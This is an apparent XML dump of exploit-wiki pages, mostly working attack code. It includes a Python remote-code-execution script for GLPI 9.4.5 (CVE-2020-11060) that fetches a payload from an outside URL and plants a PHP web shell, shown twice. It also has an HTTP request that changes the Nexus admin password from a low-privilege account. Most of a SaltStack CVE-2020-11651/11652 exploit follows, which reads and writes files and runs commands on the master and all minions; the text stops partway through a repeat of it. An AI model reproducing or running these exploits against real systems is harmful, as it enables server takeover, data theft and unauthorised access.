# Exploit Title: GLPI 9.4.5 - Remote Code Execution (RCE)
# Exploit Author: Brian Peters
# Vendor Homepage: https://glpi-project.org
# Software Link: https://github.com/glpi-project/glpi/releases
# Version: &lt; 9.4.6
# CVE: CVE-2020-11060

# Download a SQL dump and find the table offset for "wifinetworks" with 
# cat &lt;sqlfile&gt; | grep "CREATE TABLE" | grep -n wifinetworks
# Update the offsettable value with this number in the create_dump function
# The Nix/Win paths are based on defaults. You can use curl -I &lt;url&gt; and use md5sum to find the path based
# on the Set-Cookie hash.

#!/usr/bin/python

import argparse
import json
import random
import re
import requests
import string
import sys
import time
from datetime import datetime
from lxml import html

class GlpiBrowser:
    
    def __init__(self, url, user, password, platform):
        self.url = url
        self.user = user
        self.password = password
        self.platform = platform
        
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    def extract_csrf(self, html):
        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]
    
    def get_login_data(self):
        r = self.session.get('{0}'.format(self.url), allow_redirects=True)
        
        csrf_token = self.extract_csrf(r.text)
        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]
        
        return name_field, pass_field, csrf_token
    
    def login(self):
        try:
            name_field, pass_field, csrf_token = self.get_login_data()
        except Exception as e:
            print "[-] Login error: could not retrieve form data"
            sys.exit(1)
        
        data = {
            name_field: self.user, 
            pass_field: self.password,
            "auth": "local",
            "submit": "Post",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)
        
        return r.status_code == 302
        
    def wipe_networks(self, padding, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content
        
        r = self.session.get('{0}/front/wifinetwork.php#modal_massaction_contentb5e83b3aa28f203595c34c5dbcea85c9'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Edit network error: could not retrieve form data"
            sys.exit(1)
            
        webpage = html.fromstring(r.content)
        links = webpage.xpath('//a/@href')
        for rawlink in links:
            if "wifinetwork.form.php?id=" in rawlink:
        	rawlinkparts = rawlink.split("=")
        	networkid = rawlinkparts[-1]
        	print "Deleting network "+networkid
        	
        	data = {
        	    "entities_id": "0",
	            "is_recursive": "0",
        	    "name": "PoC",
        	    "comment": comment,
        	    "essid": "RCE"+padding,
        	    "mode": "ad-hoc",
		    "purge": "Delete permanently",
		    "id": networkid,
                    "_glpi_csrf_token": csrf_token,
                    '_read_date_mod': datemod
                }
        
                r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
    
    def create_network(self, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content

        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Create network error: could not retrieve form data"
            sys.exit(1)
        
        data = {
	    "entities_id": "0",
	    "is_recursive": "0",
	    "name": "PoC",
	    "comment": comment,
	    "essid": "RCE",
	    "mode": "ad-hoc",
	    "add": "ADD",
            "_glpi_csrf_token": csrf_token,
            '_read_date_mod': datemod
        }
        
        r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
        print "[+] Network created"
        print "      Name: PoC"
        print "      ESSID: RCE"
        
    def edit_network(self, padding, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content
        #create the padding for the name and essid
        
        
        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
        webpage = html.fromstring(r.content)
        links = webpage.xpath('//a/@href')
        for rawlink in links:
            if "wifinetwork.form.php?id=" in rawlink:
                rawlinkparts = rawlink.split('/')
                link = rawlinkparts[-1]
                
                #edit the network name and essid
                r = self.session.get('{0}/front/{1}'.format(self.url, link))
                try:
            	    csrf_token = self.extract_csrf(r.text)
        	except Exception as e:
        	    print "[-] Edit network error: could not retrieve form data"
        	    sys.exit(1)
        	    
        	rawlinkparts = rawlink.split("=")
        	networkid = rawlinkparts[-1]
        	        	    
                data = {
        	    "entities_id": "0",
        	    "is_recursive": "0",
        	    "name": "PoC",
        	    "comment": comment,
        	    "essid": "RCE"+padding,
        	    "mode": "ad-hoc",
        	    "update": "Save",
        	    "id": networkid,
                    "_glpi_csrf_token": csrf_token,
                    "_read_date_mod": datemod
                }
                r = self.session.post('{0}/front/wifinetwork.form.php'.format(self.url), data=data)
                print "[+] Network mofified"
                print "      New ESSID: RCE"+padding
    
    def create_dump(self, shellname):
        path=''
        if self.platform == "Win":
            path="C:\\xampp\\htdocs\\pics\\"
        elif self.platform == "Nix":
            path="/var/www/html/glpi/pics/"
        
        #adjust offset number to match the table number for wifi_networks
        #this can be found by downloading a SQL dump and running cat &lt;dumpname&gt; | grep "CREATE TABLE" | grep -n "wifinetworks"
        r = self.session.get('{0}/front/backup.php?dump=dump&amp;offsettable=312&amp;fichier={1}{2}'.format(self.url, path, shellname))
        
        print '[+] Shell: {0}/pics/{1}'.format(self.url, shellname)
        
    def shell_check(self, shellname):
        r = self.session.get('{0}/pics/{1}?0=echo%20asdfasdfasdf'.format(self.url, shellname))
        print "      Shell size: "+str(len(r.content))
        if "asdfasdfasdf" in r.content:
            print "[+] RCE FOUND!"
            sys.exit(1)
        return len(r.content)
    
    def pwn(self):
        if not self.login():
            print "[-] Login error"
            return
        else:
            print "[+] Logged in"

	#create timestamp
	now = datetime.now()
	datemod = now.strftime("%Y-%m-%d %H:%M:%S")

        #create comment payload
        
        tick=1
	while True:
	    #create random shell name
            letters = string.ascii_letters
	    shellname = ''.join(random.choice(letters) for i in range(8))+".php"
	    
	    #create padding for ESSID
	    padding = ''
            for i in range(1,int(tick)+1):
                padding+=str(i)
	    
	    self.wipe_networks(padding, datemod)
	    self.create_network(datemod)
            self.edit_network(padding, datemod)            
            self.create_dump(shellname)
            self.shell_check(shellname)
	    print "\n"
            raw_input("Press any key to continue with the next iteration...")
            tick+=1

        return
        
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--user", help="Username", required=True)
    parser.add_argument("--password", help="Password", required=True)
    parser.add_argument("--platform", help="Win/Nix", required=True)
    
    args = parser.parse_args()
    
    g = GlpiBrowser(args.url, user=args.user, password=args.password, platform=args.platform)
    
    g.pwn()
&lt;/pre&gt;</text>
      <sha1>smxecxf415v47bpwpzcih77no6qkcaw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11060 GLPI 9.4.5 遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4386</id>
    <revision>
      <id>5052</id>
      <timestamp>2021-06-15T01:22:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-11060 GLPI 9.4.5 远程代码执行漏洞"</comment>
      <origin>5052</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8633" sha1="9b03cuqmfxn5z5pb5q97hnnok4xhu33" xml:space="preserve">&lt;languages /&gt;
==影响版本==
&lt;pre&gt;
Version: &lt; 9.4.6
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: GLPI 9.4.5 - Remote Code Execution (RCE)
# Exploit Author: Brian Peters
# Vendor Homepage: https://glpi-project.org
# Software Link: https://github.com/glpi-project/glpi/releases
# Version: &lt; 9.4.6
# CVE: CVE-2020-11060

# Download a SQL dump and find the table offset for "wifinetworks" with 
# cat &lt;sqlfile&gt; | grep "CREATE TABLE" | grep -n wifinetworks
# Update the offsettable value with this number in the create_dump function
# The Nix/Win paths are based on defaults. You can use curl -I &lt;url&gt; and use md5sum to find the path based
# on the Set-Cookie hash.

#!/usr/bin/python

import argparse
import json
import random
import re
import requests
import string
import sys
import time
from datetime import datetime
from lxml import html

class GlpiBrowser:
    
    def __init__(self, url, user, password, platform):
        self.url = url
        self.user = user
        self.password = password
        self.platform = platform
        
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    def extract_csrf(self, html):
        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]
    
    def get_login_data(self):
        r = self.session.get('{0}'.format(self.url), allow_redirects=True)
        
        csrf_token = self.extract_csrf(r.text)
        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]
        
        return name_field, pass_field, csrf_token
    
    def login(self):
        try:
            name_field, pass_field, csrf_token = self.get_login_data()
        except Exception as e:
            print "[-] Login error: could not retrieve form data"
            sys.exit(1)
        
        data = {
            name_field: self.user, 
            pass_field: self.password,
            "auth": "local",
            "submit": "Post",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)
        
        return r.status_code == 302
        
    def wipe_networks(self, padding, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content
        
        r = self.session.get('{0}/front/wifinetwork.php#modal_massaction_contentb5e83b3aa28f203595c34c5dbcea85c9'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Edit network error: could not retrieve form data"
            sys.exit(1)
            
        webpage = html.fromstring(r.content)
        links = webpage.xpath('//a/@href')
        for rawlink in links:
            if "wifinetwork.form.php?id=" in rawlink:
        	rawlinkparts = rawlink.split("=")
        	networkid = rawlinkparts[-1]
        	print "Deleting network "+networkid
        	
        	data = {
        	    "entities_id": "0",
	            "is_recursive": "0",
        	    "name": "PoC",
        	    "comment": comment,
        	    "essid": "RCE"+padding,
        	    "mode": "ad-hoc",
		    "purge": "Delete permanently",
		    "id": networkid,
                    "_glpi_csrf_token": csrf_token,
                    '_read_date_mod': datemod
                }
        
                r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
    
    def create_network(self, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content

        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Create network error: could not retrieve form data"
            sys.exit(1)
        
        data = {
	    "entities_id": "0",
	    "is_recursive": "0",
	    "name": "PoC",
	    "comment": comment,
	    "essid": "RCE",
	    "mode": "ad-hoc",
	    "add": "ADD",
            "_glpi_csrf_token": csrf_token,
            '_read_date_mod': datemod
        }
        
        r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
        print "[+] Network created"
        print "      Name: PoC"
        print "      ESSID: RCE"
        
    def edit_network(self, padding, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content
        #create the padding for the name and essid
        
        
        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
        webpage = html.fromstring(r.content)
        links = webpage.xpath('//a/@href')
        for rawlink in links:
            if "wifinetwork.form.php?id=" in rawlink:
                rawlinkparts = rawlink.split('/')
                link = rawlinkparts[-1]
                
                #edit the network name and essid
                r = self.session.get('{0}/front/{1}'.format(self.url, link))
                try:
            	    csrf_token = self.extract_csrf(r.text)
        	except Exception as e:
        	    print "[-] Edit network error: could not retrieve form data"
        	    sys.exit(1)
        	    
        	rawlinkparts = rawlink.split("=")
        	networkid = rawlinkparts[-1]
        	        	    
                data = {
        	    "entities_id": "0",
        	    "is_recursive": "0",
        	    "name": "PoC",
        	    "comment": comment,
        	    "essid": "RCE"+padding,
        	    "mode": "ad-hoc",
        	    "update": "Save",
        	    "id": networkid,
                    "_glpi_csrf_token": csrf_token,
                    "_read_date_mod": datemod
                }
                r = self.session.post('{0}/front/wifinetwork.form.php'.format(self.url), data=data)
                print "[+] Network mofified"
                print "      New ESSID: RCE"+padding
    
    def create_dump(self, shellname):
        path=''
        if self.platform == "Win":
            path="C:\\xampp\\htdocs\\pics\\"
        elif self.platform == "Nix":
            path="/var/www/html/glpi/pics/"
        
        #adjust offset number to match the table number for wifi_networks
        #this can be found by downloading a SQL dump and running cat &lt;dumpname&gt; | grep "CREATE TABLE" | grep -n "wifinetworks"
        r = self.session.get('{0}/front/backup.php?dump=dump&amp;offsettable=312&amp;fichier={1}{2}'.format(self.url, path, shellname))
        
        print '[+] Shell: {0}/pics/{1}'.format(self.url, shellname)
        
    def shell_check(self, shellname):
        r = self.session.get('{0}/pics/{1}?0=echo%20asdfasdfasdf'.format(self.url, shellname))
        print "      Shell size: "+str(len(r.content))
        if "asdfasdfasdf" in r.content:
            print "[+] RCE FOUND!"
            sys.exit(1)
        return len(r.content)
    
    def pwn(self):
        if not self.login():
            print "[-] Login error"
            return
        else:
            print "[+] Logged in"

	#create timestamp
	now = datetime.now()
	datemod = now.strftime("%Y-%m-%d %H:%M:%S")

        #create comment payload
        
        tick=1
	while True:
	    #create random shell name
            letters = string.ascii_letters
	    shellname = ''.join(random.choice(letters) for i in range(8))+".php"
	    
	    #create padding for ESSID
	    padding = ''
            for i in range(1,int(tick)+1):
                padding+=str(i)
	    
	    self.wipe_networks(padding, datemod)
	    self.create_network(datemod)
            self.edit_network(padding, datemod)            
            self.create_dump(shellname)
            self.shell_check(shellname)
	    print "\n"
            raw_input("Press any key to continue with the next iteration...")
            tick+=1

        return
        
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--user", help="Username", required=True)
    parser.add_argument("--password", help="Password", required=True)
    parser.add_argument("--platform", help="Win/Nix", required=True)
    
    args = parser.parse_args()
    
    g = GlpiBrowser(args.url, user=args.user, password=args.password, platform=args.platform)
    
    g.pwn()
&lt;/pre&gt;</text>
      <sha1>9b03cuqmfxn5z5pb5q97hnnok4xhu33</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11239 Qualcomm kgsl 任意內核代碼執行漏洞</title>
    <ns>0</ns>
    <id>1295</id>
    <revision>
      <id>1623</id>
      <timestamp>2021-04-13T09:28:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Qualcomm/CVE-2020-11239"</comment>
      <origin>1623</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="104" sha1="8jb47cf7y8gjjmugvpf7u8zrzan7jmk" xml:space="preserve">==EXP==
https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Qualcomm/CVE-2020-11239</text>
      <sha1>8jb47cf7y8gjjmugvpf7u8zrzan7jmk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11444 Nexus Repository Manger change-password 低權限修改管理員密碼漏洞</title>
    <ns>0</ns>
    <id>5625</id>
    <revision>
      <id>6464</id>
      <timestamp>2021-07-08T06:21:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Nexus 3.x OSS / Pro &lt;= 3.21.1 &lt;/pre&gt;  &lt;translate&gt; ==前提條件== &lt;/translate&gt; &lt;translate&gt; 需要任意賬戶權..."</comment>
      <origin>6464</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="930" sha1="9y4oxy7mzqxda6z6lgm3ernxdphp8uq" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Nexus 3.x OSS / Pro &lt;= 3.21.1
&lt;/pre&gt;

&lt;translate&gt;
==前提條件==
&lt;/translate&gt;
&lt;translate&gt;
需要任意賬戶權限。
&lt;/translate&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;
&lt;translate&gt;
登錄任意用戶後修改 NXSESSIONID，發送請求包修改管理員賬號密碼
&lt;/translate&gt;
&lt;pre&gt;
PUT /service/rest/beta/security/users/admin/change-password HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.6080434247960143
Content-Type: text/plain
Origin: http://139.198.174.173:8081
Cookie: NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=76b37c99-046c-47a9-ba7d-fd4cfa33b7ff
Content-Length: 11

data=123456
&lt;/pre&gt;
&lt;translate&gt;
返回204則修改成功
&lt;/translate&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://short.pwnwiki.org/?c=pqCGju</text>
      <sha1>9y4oxy7mzqxda6z6lgm3ernxdphp8uq</sha1>
    </revision>
    <revision>
      <id>6465</id>
      <parentid>6464</parentid>
      <timestamp>2021-07-08T06:22:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6465</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1007" sha1="r0g3jdm8zd5t5boern3sc9f7wifb3j5" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Nexus 3.x OSS / Pro &lt;= 3.21.1
&lt;/pre&gt;

&lt;translate&gt;
==前提條件== &lt;!--T:2--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:3--&gt;
需要任意賬戶權限。
&lt;/translate&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:4--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:5--&gt;
登錄任意用戶後修改 NXSESSIONID，發送請求包修改管理員賬號密碼
&lt;/translate&gt;
&lt;pre&gt;
PUT /service/rest/beta/security/users/admin/change-password HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.6080434247960143
Content-Type: text/plain
Origin: http://139.198.174.173:8081
Cookie: NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=76b37c99-046c-47a9-ba7d-fd4cfa33b7ff
Content-Length: 11

data=123456
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:6--&gt;
返回204則修改成功
&lt;/translate&gt;

&lt;translate&gt;
==參考== &lt;!--T:7--&gt;
&lt;/translate&gt;
https://short.pwnwiki.org/?c=pqCGju</text>
      <sha1>r0g3jdm8zd5t5boern3sc9f7wifb3j5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11651 SaltStack 認證繞過漏洞</title>
    <ns>0</ns>
    <id>1497</id>
    <revision>
      <id>1878</id>
      <timestamp>2021-04-23T00:56:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==EXP== &lt;pre&gt; #!/usr/bin/env python # # Exploit for CVE-2020-11651 and CVE-2020-11652 # Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020…」的新頁面</comment>
      <origin>1878</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10262" sha1="4mh5r62aa1m7yrudeycsx045ihtfb7v" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python
#
# Exploit for CVE-2020-11651 and CVE-2020-11652
# Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)
# This exploit is based on this checker script:
# https://github.com/rossengeorgiev/salt-security-backports

from __future__ import absolute_import, print_function, unicode_literals
import argparse
import datetime
import os
import os.path
import sys
import time

import salt
import salt.version
import salt.transport.client
import salt.exceptions

def init_minion(master_ip, master_port):
    minion_config = {
        'transport': 'zeromq',
        'pki_dir': '/tmp',
        'id': 'root',
        'log_level': 'debug',
        'master_ip': master_ip,
        'master_port': master_port,
        'auth_timeout': 5,
        'auth_tries': 1,
        'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port)
    }

    return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')

# --- check funcs ----

def check_connection(master_ip, master_port, channel):
  print("[+] Checking salt-master ({}:{}) status... ".format(master_ip, master_port), end='')
  sys.stdout.flush()

  # connection check
  try:
    channel.send({'cmd':'ping'}, timeout=2)
  except salt.exceptions.SaltReqTimeoutError:
    print("OFFLINE")
    sys.exit(1)
  else:
    print("ONLINE")

def check_CVE_2020_11651(channel):
  print("[+] Checking if vulnerable to CVE-2020-11651... ", end='')
  sys.stdout.flush()

  try:
    rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3)
  except:
    print('ERROR')
    return None
  else:
    pass
  finally:
    if rets:
      print('YES')
      root_key = rets[2]['root']
      return root_key

  print('NO')
  return None

def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path):
  print("[+] Checking if vulnerable to CVE-2020-11652 (read_token)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'cmd': 'get_token',
    'arg': [],
    'token': top_secret_file_path,
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("YES")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    print("NO")
  
def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (read)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.read',
    'path': top_secret_file_path,
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets['data']['return']:
      print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write1(debug, channel, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (write1)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.write',
    'path': '../../../../../../../../tmp/salt_CVE_2020_11652',
    'data': 'evil',
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)

    pp(rets)
    if rets['data']['return'].startswith('Wrote'):
      try:
        os.remove('/tmp/salt_CVE_2020_11652')
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write2(debug, channel, root_key):
  print("[+] Checking if vulnerable to CVE-2020-11652 (write2)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'config.update_config',
    'file_name': '../../../../../../../../tmp/salt_CVE_2020_11652',
    'yaml_contents': 'evil',
    'saltenv': 'base',
  }

  try:
    rets = channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if debug:
      print()
      print(rets)
    if rets['data']['return'].startswith('Wrote'):
      try:
        os.remove('/tmp/salt_CVE_2020_11652.conf')
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def pwn_read_file(channel, root_key, path, master_ip):
    print("[+] Attemping to read {} from {}".format(path, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.read',
        'path': path,
        'saltenv': 'base',
    }

    rets = channel.send(msg, timeout=3)
    print(rets['data']['return'][0][path])

def pwn_upload_file(channel, root_key, src, dest, master_ip):
    print("[+] Attemping to upload {} to {} on {}".format(src, dest, master_ip))
    sys.stdout.flush()

    try:
        fh = open(src, 'rb')
        payload = fh.read()
        fh.close()
    except Exception as e:
        print('[-] Failed to read {}: {}'.format(src, e))
        return

    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.write',
        'saltenv': 'base',
        'data': payload,
        'path': dest,
    }

    rets = channel.send(msg, timeout=3)
    print('[ ] {}'.format(rets['data']['return']))

def pwn_exec(channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute {} on {}".format(cmd, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': 'runner',
        'fun': 'salt.cmd',
        'saltenv': 'base',
        'user': 'sudo_user',
        'kwarg': {
            'fun': 'cmd.exec_code',
            'lang': 'python',
            'code': "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
        },
        'jid': jid,
    }

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print('[-] Failed to submit job')
        return

    if rets.get('jid'):
        print('[+] Successfully scheduled job: {}'.format(rets['jid']))

def pwn_exec_all(channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute '{}' on all minions connected to {}".format(cmd, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': '_send_pub',
        'fun': 'cmd.run',
        'user': 'root',
        'arg': [ "/bin/sh -c '{}'".format(cmd) ],
        'tgt': '*',
        'tgt_type': 'glob',
        'ret': '',
        'jid': jid
    }

    try:
        rets = channel.send(msg, timeout=3)
    except Exception as e:
        print('[-] Failed to submit job')
        return
    finally:
        if rets == None:
            print('[+] Successfully submitted job to all minions.')
        else:
            print('[-] Failed to submit job')


def main():
    parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652')
    parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1')
    parser.add_argument('--port', '-p', dest='master_port', default='4506')
    parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')
    parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true')
    parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true')
    parser.add_argument('--read', '-r', dest='read_file')
    parser.add_argument('--upload-src', dest='upload_src')
    parser.add_argument('--upload-dest', dest='upload_dest')
    parser.add_argument('--exec', dest='exec', help='Run a command on the master')
    parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions')
    args = parser.parse_args()

    print("[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.")
    time.sleep(1)

    # Both src and destination are required for uploads
    if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None):
        print('[-] Must provide both --upload-src and --upload-dest')
        sys.exit(1)

    channel = init_minion(args.master_ip, args.master_port)

    check_connection(args.master_ip, args.master_port, channel)
    
    root_key = check_CVE_2020_11651(channel)
    if root_key:
        print('[*] root key obtained: {}'.format(root_key))
    else:
        print('[-] Failed to find root key...aborting')
        sys.exit(127)

    if args.run_checks:
        # Assuming this check runs on the master itself, create a file with "secret" content
        # and abuse CVE-2020-11652 to read it.
        top_secret_file_path = '/tmp/salt_cve_teta'
        with salt.utils.fopen(top_secret_file_path, 'w') as fd:
            fd.write("top secret")

        # Again, this assumes we're running this check on the master itself
        with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd:
            root_key = keyfd.read()

        check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path)
        check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key)
        check_CVE_2020_11652_write1(debug, channel, root_key)
        check_CVE_2020_11652_write2(debug, channel, root_key)
        os.remove(top_secret_file_path)
        sys.exit(0)

    if args.read_file:
        pwn_read_file(channel, root_key, args.read_file, args.master_ip)

    if args.upload_src:
        if os.path.isabs(args.upload_dest):
            print('[-] Destination path must be relative; aborting')
            sys.exit(1)
        pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip)


    jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())

    if args.exec:
        pwn_exec(channel, root_key, args.exec, args.master_ip, jid)

    if args.exec_all:
        print("[!] Lester, is this what you want? Hit ^C to abort.")
        time.sleep(2)
        pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid)


if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>4mh5r62aa1m7yrudeycsx045ihtfb7v</sha1>
    </revision>
    <revision>
      <id>1879</id>
      <parentid>1878</parentid>
      <timestamp>2021-04-23T00:56:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* EXP */</comment>
      <origin>1879</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10296" sha1="tagicqx2jwwhlp08rapq8vsyyludttn" xml:space="preserve">==EXP==
該EXP也適用於CVE-2020-11652

&lt;pre&gt;
#!/usr/bin/env python
#
# Exploit for CVE-2020-11651 and CVE-2020-11652
# Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)
# This exploit is based on this checker script:
# https://github.com/rossengeorgiev/salt-security-backports

from __future__ import absolute_import, print_function, unicode_literals
import argparse
import datetime
import os
import os.path
import sys
import time

import salt
import salt.version
import salt.transport.client
import salt.exceptions

def init_minion(master_ip, master_port):
    minion_config = {
        'transport': 'zeromq',
        'pki_dir': '/tmp',
        'id': 'root',
        'log_level': 'debug',
        'master_ip': master_ip,
        'master_port': master_port,
        'auth_timeout': 5,
        'auth_tries': 1,
        'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port)
    }

    return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')

# --- check funcs ----

